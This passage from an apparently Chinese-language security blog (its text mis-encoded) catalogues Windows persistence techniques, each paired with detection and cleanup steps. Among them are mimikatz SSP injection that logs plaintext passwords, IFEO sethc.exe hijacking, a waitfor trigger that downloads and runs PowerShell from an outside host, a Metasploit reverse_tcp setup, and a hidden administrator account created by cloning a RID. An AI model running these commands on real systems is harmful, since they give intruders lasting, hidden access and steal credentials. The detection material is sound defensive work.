&#x3D; @&#123;</span><br><span class="line">Filter &#x3D; [Ref] $Filter;</span><br><span class="line">Consumer &#x3D; [Ref] $Consumer;</span><br><span class="line">&#125;</span><br><span class="line">$FilterToConsumerBinding &#x3D; New-CimInstance -Namespace root&#x2F;subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs</span><br></pre></td></tr></table></figure>

<h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><p>å‚è§<a href="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/">Persistence â€“ WMI Event Subscription</a>æ–‡ç« æœ«å°¾ã€‚</p>
<h4 id="æ’æŸ¥-5"><a href="#æ’æŸ¥-5" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>ä½¿ç”¨autoRunsæ£€æŸ¥WMIè®¢é˜…ï¼Œå¹¶åˆ é™¤å¯ç–‘çš„äº‹ä»¶è®¢é˜…ã€‚<br>æˆ–è€…ä½¿ç”¨powershellå‘½ä»¤è¿›è¡Œæ’æŸ¥å’Œæ¸…é™¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åˆ—å‡º</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</span><br><span class="line"></span><br><span class="line"># æ¸…é™¤</span><br><span class="line">$EventConsumerToCleanup &#x3D; Get-WmiObject -Namespace root&#x2F;subscription -Class CommandLineEventConsumer -Filter &quot;Name &#x3D; &#39;Pentestlab-WMI&#39;&quot;</span><br><span class="line">$EventFilterToCleanup &#x3D; Get-WmiObject -Namespace root&#x2F;subscription -Class __EventFilter -Filter &quot;Name &#x3D; &#39;Pentestlab-WMI&#39;&quot;</span><br><span class="line">$FilterConsumerBindingToCleanup &#x3D; Get-WmiObject -Namespace root&#x2F;subscription -Query &quot;REFERENCES OF &#123;$($EventConsumerToCleanup.__RELPATH)&#125; WHERE ResultClass &#x3D; __FilterToConsumerBinding&quot;</span><br><span class="line">$FilterConsumerBindingToCleanup | Remove-WmiObject</span><br><span class="line">$EventConsumerToCleanup | Remove-WmiObject</span><br><span class="line">$EventFilterToCleanup | Remove-WmiObject</span><br></pre></td></tr></table></figure>

<h3 id="æ˜æ–‡è´¦å·è®°å½•"><a href="#æ˜æ–‡è´¦å·è®°å½•" class="headerlink" title="æ˜æ–‡è´¦å·è®°å½•"></a>æ˜æ–‡è´¦å·è®°å½•</h3><p>ä¸€èˆ¬æ˜æ–‡è´¦å·è®°å½•éƒ½ä¼šç”¨åˆ°mimikatzï¼Œç®€è¿°ä¸€ä¸‹mimikatzçš„ç›¸å…³çŸ¥è¯†ç‚¹å’Œä½¿ç”¨åŸç†ã€‚</p>
<p>SSP(Security support provider)æ˜¯ç”¨äºæ‰©å±•Windowsçš„å®‰å…¨éªŒè¯æœºåˆ¶çš„APIã€‚LSASSåº”ç”¨ç¨‹åºä¼šåœ¨Windowså¼€æœºå¯åŠ¨æ˜¯åŠ è½½SSPçš„å¤šä¸ªdllæ–‡ä»¶ï¼Œè¿™ä¹Ÿè®©é»‘å®¢æœ‰æœºä¼šæ³¨å…¥ä»»æ„ä¸€ä¸ªSSPçš„dllæ–‡ä»¶æ¥å’ŒLSASSè¿›ç¨‹è¿›è¡Œäº¤äº’å¹¶æå–å‡ºè¿›ç¨‹ç©ºé—´ä¸­çš„æ‰€æœ‰å¯†ç ï¼Œå¦å¤–è¿˜èƒ½åˆ©ç”¨æ¶æ„SSPæ¥patchè¿›ç¨‹ã€‚<br>æƒ³æ³¨å…¥æ¶æ„SSPéœ€è¦æ‹¥æœ‰administratorçº§åˆ«æƒé™ï¼Œæ–¹å¼æœ‰ä¸¤ç§ï¼š<br>1.é€šè¿‡SSP DLL<br>2.æ³¨å…¥å†…å­˜<br>å·¥å…·Mimikatzã€Empireã€PowerSploitå‡æ”¯æŒä»¥ä¸Šä¸¤ç§æ³¨å…¥æ–¹å¼ã€‚<br>Empireå’ŒPowerSploitæœ¬è´¨ä¸Šè¿˜æ˜¯è°ƒç”¨çš„Mimikatzã€‚</p>
<p>1.é€šè¿‡SSP DLLçš„æ–¹å¼<br>(a)å°†<code>mimilib.dll</code>ç§»åŠ¨åˆ°<code>C:\Windows\System32\</code>ç›®å½•ä¸‹ã€‚<br>(b)å°†<code>mimilib.dll</code>æ·»åŠ åˆ°æ³¨å†Œè¡¨<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code>é¡¹ä¸­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; &#x2F;v &quot;Security Packages&quot; &#x2F;d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; &#x2F;t REG_MULTI_SZ</span><br></pre></td></tr></table></figure>
<p>(c)ç”±äºæ³¨å†Œè¡¨å·²è¢«ç¯¡æ”¹ä¸”DLLå­˜å‚¨åœ¨ç³»ç»Ÿä¸­ï¼Œå› æ­¤<code>mimilib.dll</code>åœ¨é‡æ–°å¯åŠ¨åæŒç»­å­˜åœ¨ã€‚å½“åŸŸçš„ç”¨æˆ·å†æ¬¡é€šè¿‡ç³»ç»Ÿè¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œå°†åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶<code>C:\Windows\System32\kiwissp.log</code>è®°å½•å¸æˆ·çš„å‡­æ®ã€‚</p>
<p>2.é€šè¿‡æ³¨å…¥å†…å­˜çš„æ–¹å¼<br>(a)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # misc::memssp</span><br></pre></td></tr></table></figure>
<p>(b)å½“ç”¨æˆ·å†æ¬¡é€šè¿‡ç³»ç»Ÿè¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œå°†åˆ›å»ºä¸€ä¸ªæ—¥å¿—æ–‡ä»¶<code>C:\Windows\System32\mimilsa.log</code>ï¼ŒåŒ…å«æ–‡æœ¬å½¢å¼çš„ç”¨æˆ·å¯†ç ã€‚æ³¨æ„è¯¥æ–¹å¼é‡å¯åå¤±æ•ˆã€‚</p>
<h4 id="æ’æŸ¥-6"><a href="#æ’æŸ¥-6" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>1.æ˜¯å¦å­˜åœ¨æ—¥å¿—æ–‡ä»¶<br><code>C:\Windows\System32\kiwissp.log</code><br><code>C:\Windows\System32\mimilsa.log</code><br>2.æ³¨å†Œè¡¨é¡¹æ˜¯å¦æœ‰æ–°å¢å¯ç–‘dll<br><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></p>
<h3 id="Appinit"><a href="#Appinit" class="headerlink" title="Appinit"></a>Appinit</h3><p>windowsæä¾›äº†å…è®¸å°†è‡ªå®šä¹‰dllåŠ è½½åˆ°å‡ ä¹æ‰€æœ‰åº”ç”¨ç¨‹åºè¿›ç¨‹çš„åŠŸèƒ½ï¼Œå¯ä»¥åˆ©ç”¨äºæƒé™ç»´æŒã€‚<br>ç›¸å…³æ³¨å†Œè¡¨é¡¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># é»˜è®¤æ˜¯ç¦ç”¨appinitåŠ è½½dllçš„åŠŸèƒ½ï¼Œéœ€è¦å°†LoadAppInit_DLLså€¼ä¿®æ”¹ä¸º1æ¥å¯ç”¨</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs - 0x1</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs - 0x1</span><br><span class="line"> </span><br><span class="line"># AppInit_DLLsçš„é”®å€¼ä¿®æ”¹ä¸ºæ¶æ„dllçš„è·¯å¾„</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>
<p>ä½†è¯¥æŠ€æœ¯åˆ©ç”¨æœ‰ä¸ªé—®é¢˜ï¼Œç”±äºå‡ ä¹æ‰€æœ‰è¿›ç¨‹éƒ½ä¼šåŠ è½½è¯¥dllï¼Œäº§ç”Ÿå¤§é‡è¿æ¥ã€‚<br>å¯ä»¥ç»“åˆDidier Stevenså¼€å‘çš„<a href="https://www.didierstevens.com/files/software/LoadDLLViaAppInit_V0_0_0_1.zip">DLL</a>æ¥ä½¿ç”¨è¯¥æŠ€æœ¯ã€‚è¯¥DLLé€šè¿‡<code>LoadDLLViaAppInit.bl.txt</code>é…ç½®æ–‡ä»¶æ¥æ§åˆ¶å“ªäº›ç¨‹åºåŠ è½½å“ªä¸ªdllã€‚</p>
<h3 id="Netsh-Helper"><a href="#Netsh-Helper" class="headerlink" title="Netsh Helper"></a>Netsh Helper</h3><p>netshè¢«Windowsç”¨äºæ‰§è¡Œä¸ç³»ç»Ÿç½‘ç»œé…ç½®ç›¸å…³çš„ä»»åŠ¡ï¼Œå¹¶åœ¨åŸºäºä¸»æœºçš„Windowsé˜²ç«å¢™ä¸Šè¿›è¡Œä¿®æ”¹ã€‚å› ä¸ºå¯ä»¥ä½¿ç”¨dllæ–‡ä»¶æ¥æ‰©å±•netshçš„åŠŸèƒ½ï¼Œæ‰€ä»¥èƒ½è¢«åˆ©ç”¨äºæƒé™ç»´æŒã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh</span><br><span class="line">add helper path-to-malicious-dll</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ åï¼Œæ¯æ¬¡netshå¯åŠ¨æ—¶dlléƒ½ä¼šæ‰§è¡Œã€‚ä½†é»˜è®¤æƒ…å†µä¸‹netshä¸ä¼šè‡ªå¯åŠ¨ã€‚å¯ä»¥æ·»åŠ åˆ°å¼€æœºå¯åŠ¨çš„æ³¨å†Œè¡¨é¡¹æˆ–è€…åˆ©ç”¨æœåŠ¡ã€è®¡åˆ’ä»»åŠ¡ã€‚<br><code>add helper</code>ä¼šå°†dllè·¯å¾„æ·»åŠ åˆ°æ³¨å†Œè¡¨é¡¹<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code>ä¸­ã€‚</p>
<h4 id="æ’æŸ¥-7"><a href="#æ’æŸ¥-7" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>æŸ¥çœ‹å¯¹åº”æ³¨å†Œè¡¨é¡¹<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code>ã€‚</p>
<h3 id="Application-Shimmingæ³¨å…¥dll"><a href="#Application-Shimmingæ³¨å…¥dll" class="headerlink" title="Application Shimmingæ³¨å…¥dll"></a>Application Shimmingæ³¨å…¥dll</h3><p>Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim)ç”¨äºè½¯ä»¶åœ¨ä¸åŒç‰ˆæœ¬winæ“ä½œç³»ç»Ÿä¸Šçš„å…¼å®¹æ€§ã€‚ä½¿ç”¨è¯¥æ¡†æ¶ä¼šåˆ›å»ºshimä½œä¸ºç¨‹åºå’Œwinæ“ä½œç³»ç»Ÿä¹‹é—´çš„ç¼“å†²åŒºï¼Œå½“ç¨‹åºæ‰§è¡Œæ—¶ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨shimæ•°æ®åº“(.sdb)å°±ä¼šå¼•ç”¨shimç¼“å­˜ã€‚<br>è¯¥å·¥å…·åŒ…(ACT)çš„åŠŸèƒ½ä¹‹ä¸€<code>InjectDLL</code>å¯ä»¥ç”¨äºå°†dllæ³¨å…¥åˆ°ç¨‹åºä¸­ã€‚</p>
<p>step1.åˆ›å»º<code>xxx.sdb</code><br>è¿™ä¸€æ­¥å¯ä»¥åœ¨è‡ªå·±ä¸»æœºä¸Šæ‰§è¡Œï¼Œåªè¦åˆ›å»ºæ—¶å‚æ•°è®¾ç½®æ— è¯¯ã€‚<br>(a)æ‰“å¼€compatibility administratorç¨‹åºï¼Œé€‰æ‹©<code>Create new Application Fix</code>ï¼Œå¡«å†™è¢«æ³¨å…¥dllç¨‹åºçš„ç¨‹åºåä¸è·¯å¾„ã€‚<br>(b)åœ¨<code>Compatibility Fixes</code>æ­¥éª¤ä¸­å‹¾é€‰<code>InjectDLL</code>ï¼Œå¹¶åœ¨é€‰é¡¹<code>Parameters</code>ä¸­çš„<code>Command line</code>å¡«å†™æ¶æ„dllè·¯å¾„ã€‚<br>step2.å®‰è£…<code>xxx.sdb</code><br>æ‰§è¡Œcmdå‘½ä»¤ï¼š<code>sdbinst xxx.sdb</code></p>
<p>tips: é€šè¿‡sdbinstå®‰è£…sdbä¼šåŒæ—¶åˆ›å»ºå¸è½½ç¨‹åºï¼Œå³åœ¨ç³»ç»Ÿçš„<code>programs and features</code>å¯ä»¥å‘ç°å¹¶å¸è½½å®ƒã€‚åŒæ—¶è¯¥sdbç¨‹åºä¼šè¢«æ‹·è´åˆ°<code>C:\Windows\apppatch\CustomSDB</code>ã€‚é€šè¿‡å·¥å…·<a href="https://github.com/evil-e/sdb-explorer">sdb-explorer</a>å®‰è£…sdbå¯ä»¥é¿å…å¸è½½ç¨‹åºçš„åˆ›å»ºä¸sdbæ‹·è´ã€‚</p>
<h3 id="æ˜ åƒåŠ«æŒ"><a href="#æ˜ åƒåŠ«æŒ" class="headerlink" title="æ˜ åƒåŠ«æŒ"></a>æ˜ åƒåŠ«æŒ</h3><h4 id="ä¼ ç»Ÿ"><a href="#ä¼ ç»Ÿ" class="headerlink" title="ä¼ ç»Ÿ"></a>ä¼ ç»Ÿ</h4><p>åœ¨æ³¨å†Œè¡¨ä¸­<code>sethc.exe</code>é¡¹æ·»åŠ ä¸€ä¸ªDebuggerå­—ç¬¦ï¼Œå€¼ä¸ºæƒ³è¦è¿è¡Œçš„ç¨‹åºè·¯å¾„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sethc.exeè·¯å¾„ï¼š</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…ç›´æ¥æ‰§è¡Œå‘½ä»¤:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;v Debugger &#x2F;t REG_SZ &#x2F;d &quot;Hack.exeç¨‹åºè·¯å¾„&quot;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·â€œdebuggerâ€é”®å€¼çš„ç¨‹åºä¼šæ›¿æ¢åŸæœ‰ç¨‹åºè¿è¡Œï¼Œä¾‹å¦‚æ­¤å¤„é”®å…¥äº”ä¸‹Shiftæ‰§è¡Œsethc.exeç¨‹åºæ—¶ä¼šæ‰§è¡Œç¨‹åºHack.exeã€‚</p>
<h4 id="æ–°ç‰ˆ"><a href="#æ–°ç‰ˆ" class="headerlink" title="æ–°ç‰ˆ"></a>æ–°ç‰ˆ</h4><p>åŒºåˆ«ï¼šä¼ ç»Ÿæ˜ åƒåŠ«æŒæ˜¯æ›¿æ¢ï¼Œæ–°çš„æ˜¯åœ¨ç¨‹åºAé™é»˜é€€å‡ºç»“æŸåï¼Œä¼šæ‰§è¡Œç¨‹åºBã€‚<br>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ä¿®æ”¹IFEOç›®å½•ä¸‹sethc.exeçš„GlobalFlagå€¼</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;v GlobalFlag &#x2F;t REG_DWORD &#x2F;d 512</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹SilentProcessExitä¸‹ReportingModeå€¼</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; &#x2F;v ReportingMode &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹SilentProcessExitä¸‹MonitorProcesså€¼</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; &#x2F;v MonitorProcess &#x2F;t REG_SZ &#x2F;d &quot;Hack.exeç¨‹åºè·¯å¾„&quot;</span><br></pre></td></tr></table></figure>
<p>å½“sethc.exeç¨‹åºç»“æŸæ—¶ï¼Œä¼šæ‰§è¡ŒWindows Error Reporting process(WerFault.exe)ï¼ŒHack.exeä½œä¸ºWerFault.exeçš„å­è¿›ç¨‹è¿è¡Œã€‚</p>
<h4 id="æ’æŸ¥ä¸é˜²å¾¡"><a href="#æ’æŸ¥ä¸é˜²å¾¡" class="headerlink" title="æ’æŸ¥ä¸é˜²å¾¡"></a>æ’æŸ¥ä¸é˜²å¾¡</h4><p>1.ç›´æ¥æ’æŸ¥å¯¹åº”æ³¨å†Œè¡¨çš„å€¼ã€‚<br>2.é˜²å¾¡-ä¿®æ”¹ç³»ç»Ÿé…ç½®UserAuthentication<br>ï¼ˆæš‚æ—¶æœªçŸ¥SecurityLayerä¼šä¸ä¼šå½±å“è¯¥åé—¨çš„åˆ©ç”¨ï¼‰<br>UserAuthenticationæœ‰ä¸¤ä¸ªå€¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0ï¼šè¿›è¡Œè¿œç¨‹æ¡Œé¢å‰ä¸éœ€è¦ç”¨æˆ·èº«ä»½éªŒè¯ã€‚</span><br><span class="line">1ï¼šè¿›è¡Œè¿œç¨‹æ¡Œé¢å‰éœ€è¦è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ã€‚</span><br></pre></td></tr></table></figure>
<p>å°†è¯¥å‚æ•°è®¾ç½®ä¸º1æ—¶åˆ™å¯é˜²æ­¢é»‘å®¢åˆ©ç”¨è¿œç¨‹æ¡Œé¢ç•Œé¢é”®å…¥Shiftã€‚<br>å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>

<h3 id="TimeProvider"><a href="#TimeProvider" class="headerlink" title="TimeProvider"></a>TimeProvider</h3><p>TimeProviderè¢«Windowsç³»ç»Ÿç”¨äºä»ç½‘ç»œè®¾å¤‡æˆ–å®¢æˆ·ç«¯è·å–æ—¶é—´æˆ³ã€‚å®ƒæ˜¯é€šè¿‡è°ƒç”¨system32æ–‡ä»¶å¤¹ä¸‹çš„dllæ–‡ä»¶å®ç°çš„(win7ä¸­æ˜¯w32time.dll)ï¼Œå¼€æœºå¯åŠ¨æ—¶ä¼šåŠ è½½å®ƒçš„dllæ–‡ä»¶ï¼Œå› æ­¤å¯ç”¨äºæƒé™ç»´æŒã€‚<br>å¯¹åº”æ³¨å†Œè¡¨é¡¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer</span><br><span class="line"># ç³»ç»Ÿä¼šè°ƒç”¨å“ªä¸€ä¸ªå–å†³äºç³»ç»Ÿæ˜¯ä½œä¸ºNTP serverè¿˜æ˜¯NTP client</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹é”®å€¼å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient&quot; &#x2F;v DllName &#x2F;t REG_SZ &#x2F;d &quot;C:\temp\w32time.dll&quot;</span><br></pre></td></tr></table></figure>
<p>ä½†ç›´æ¥ç¯¡æ”¹ç³»ç»Ÿçš„TimeProviderå®¹æ˜“è¢«æ£€æµ‹åˆ°ã€‚<br>æœ‰å¤§ä½¬å¼€å‘è¿‡<a href="https://github.com/scottlundgren/w32time">è‡ªå®šä¹‰çš„TimeProvider</a>ï¼Œå¯ä»¥ç”¨äºåœ¨æ“ä½œç³»ç»Ÿæ³¨å†Œä¸ºæ–°çš„TimeProviderç„¶åå†ä¿®æ”¹å®ƒçš„æ³¨å†Œè¡¨é¡¹é”®å€¼ã€‚</p>
<h4 id="æ¸…ç†"><a href="#æ¸…ç†" class="headerlink" title="æ¸…ç†"></a>æ¸…ç†</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe gametime.dll,Deregister</span><br></pre></td></tr></table></figure>

<h3 id="waitfor"><a href="#waitfor" class="headerlink" title="waitfor"></a>waitfor</h3><p>waitforæ˜¯é€šè¿‡ä¿¡å·ç”¨äºç½‘ç»œä¸­(åŒç½‘æ®µ)ä¸»æœºåŒæ­¥çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› æ­¤å¯è¢«åˆ©ç”¨äºæ–‡ä»¶ä¸‹è½½ã€å‘½ä»¤æ‰§è¡Œã€æƒé™ç»´æŒã€‚<br>è¯¥æ–‡ä»¶åœ¨<code>C:\Windows\System32</code>ç›®å½•ä¸‹ï¼Œéœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™ã€‚<br>å—å®³ä¸»æœºä¸Šæ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waitfor pentestlab &amp;&amp; powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.0.0.13:8080&#x2F;pentestlaboratories&#39;);</span><br></pre></td></tr></table></figure>
<p>æ”»å‡»ä¸»æœºä¸Šæ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waitfor &#x2F;s xxx.xxx.xxx.xxx &#x2F;si pentestlab # &#x2F;s [å—å®³ä¸»æœºip]</span><br></pre></td></tr></table></figure>
<p>ä½†è¯¥æŠ€æœ¯ç”¨äºæƒé™ç»´æŒæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå‘½ä»¤æ‰§è¡Œå®Œåwaitfor.exeä¼šé€€å‡ºã€‚<br>è§£å†³æ–¹æ¡ˆï¼š<a href="https://github.com/3gstudent/Waitfor-Persistence">Waitfor-Persistence</a><br>è¯¥è§£å†³æ–¹æ¡ˆå·²ç»é›†æˆåˆ°äº†msfä¸­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistence</span><br><span class="line">set PERSISTENCE_METHOD WAITFOR</span><br><span class="line">set WAITFOR_TRIGGER pentestlab</span><br><span class="line">set SESSION 2</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 10.0.0.13</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h3 id="åé—¨è´¦å·"><a href="#åé—¨è´¦å·" class="headerlink" title="åé—¨è´¦å·"></a>åé—¨è´¦å·</h3><p>æµ‹è¯•ç¯å¢ƒ: win7<br>1.ä¿®æ”¹æ³¨å†Œè¡¨æƒé™<br>å³é”®<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>-æƒé™-Administratorsï¼Œå…è®¸å®Œå…¨æ§åˆ¶ã€‚ä¿®æ”¹åé‡å¯æ³¨å†Œè¡¨ã€‚<br>2.æ–°å»ºç”¨æˆ·åä»¥<code>$</code>ç»“å°¾çš„ç‰¹æ®Šè´¦æˆ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user defaultuser0$ passwd233 &#x2F;add</span><br><span class="line">net localgroup administrators defaultuser0$ &#x2F;add</span><br></pre></td></tr></table></figure>
<p>ç”¨æˆ·å<code>$</code>ç»“å°¾èƒ½åœ¨ä¸€äº›æ¡ä»¶ä¸‹éšè—ï¼Œä¾‹å¦‚<code>net user</code>æ— æ³•è¯»å–åˆ°ç”¨æˆ·ï¼Œä½†æ§åˆ¶é¢æ¿ä»å¯å‘ç°ã€‚<br>3.å¯¼å‡ºæ³¨å†Œè¡¨é¡¹å¹¶ä¿®æ”¹æ–‡ä»¶<br>(a)<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\defaultuser0$</code>å³é”®å¯¼å‡ºä¸º<code>1.reg</code><br>(b)æ¯ä¸ªç”¨æˆ·éƒ½æœ‰å¯¹åº”çš„æ³¨å†Œè¡¨é”®å€¼ï¼Œå°†<code>defaultuser0$</code>å¯¹åº”çš„æ–‡ä»¶<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9</code>å³é”®å¯¼å‡ºä¸º<code>2.reg</code><br>(c)å°†ç®¡ç†å‘˜å¸æˆ·Administratorå¯¹åº”çš„æ³¨å†Œè¡¨é”®å€¼<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>å¯¼å‡ºä¸º<code>3.reg</code><br>(d)å°†æ³¨å†Œè¡¨é¡¹<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9</code>ä¸‹é”®Fçš„å€¼æ›¿æ¢ä¸º<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>ä¸‹é”®Fçš„å€¼ï¼Œå³<code>2.reg</code>ä¸­é”®Fçš„å€¼æ›¿æ¢æˆ<code>3.reg</code>ä¸­é”®Fçš„å€¼<br><img src="/images/win%E8%B4%A6%E6%88%B7%E9%9A%90%E8%97%8F%E9%94%AEF%E5%80%BC%E6%9B%BF%E6%8D%A2.png" alt="é”®Få€¼æ›¿æ¢"><br>4.åˆ é™¤ç‰¹æ®Šè´¦æˆ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user defaultuser0$ &#x2F;del</span><br></pre></td></tr></table></figure>
<p>5.å¯¼å…¥regæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regedit &#x2F;s 1.reg</span><br><span class="line">regedit &#x2F;s 2.reg</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæ•ˆæœï¼šæ§åˆ¶é¢æ¿ä¸å­˜åœ¨è¯¥å¸æˆ·ï¼Œé€šè¿‡<code>net user</code>æ— æ³•åˆ—å‡ºè¯¥å¸æˆ·ï¼Œè®¡ç®—æœºç®¡ç†-æœ¬åœ°ç”¨æˆ·å’Œç»„-ç”¨æˆ·ä¹Ÿæ— æ³•åˆ—å‡ºè¯¥å¸æˆ·ã€‚</p>
<p>åˆ©ç”¨æ³¨æ„ï¼š<br>1.ç®¡ç†å‘˜å¸æˆ·æ˜¯å¦è¢«ç¦ç”¨ï¼Œå¦‚æœè¢«ç¦ç”¨ï¼Œé‚£ä¹ˆå…‹éš†å‡ºçš„éšè—å¸æˆ·ä¹Ÿæ˜¯è¢«ç¦ç”¨çŠ¶æ€ã€‚<br>2.åœ¨3389è¿œç¨‹ç™»å½•çš„åˆ©ç”¨ä¸Šå­˜åœ¨ç›¸åŒå¸æˆ·çš„å†²çªå…³ç³»ï¼Œå³åŒæ—¶ç™»é™†ä¼šå¯¼è‡´å¯¹æ–¹ä¸‹çº¿ã€‚<br>3.Fé”®çš„äºŒè¿›åˆ¶æ•°æ®å«ä¹‰<br>åç§»é‡0x30:è´¦æˆ·RID<br>åç§»é‡0x38:å¯ç”¨è¿˜æ˜¯ç¦ç”¨å¸æˆ·ï¼Œç¦ç”¨1502ï¼Œå¯ç”¨1402ã€‚<br><img src="/images/rid%E5%8A%AB%E6%8C%81F%E9%94%AE%E5%80%BC%E5%90%AB%E4%B9%89.png" alt="Fé”®å€¼äºŒè¿›åˆ¶æ•°æ®"></p>
<h4 id="æ’æŸ¥ä¸æ¸…ç†"><a href="#æ’æŸ¥ä¸æ¸…ç†" class="headerlink" title="æ’æŸ¥ä¸æ¸…ç†"></a>æ’æŸ¥ä¸æ¸…ç†</h4><p>éšè—å¸æˆ·çš„ç™»å½•è®°å½•ï¼Œå¯é€šè¿‡æŸ¥çœ‹æ—¥å¿—è·å–ã€‚<br>åˆ é™¤æ³¨å†Œè¡¨<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>ä¸‹å¯¹åº”å¸æˆ·çš„é”®å€¼(è¯¥å±‚ç›®å½•ä¸‹+Namesç›®å½•ä¸‹)ã€‚</p>
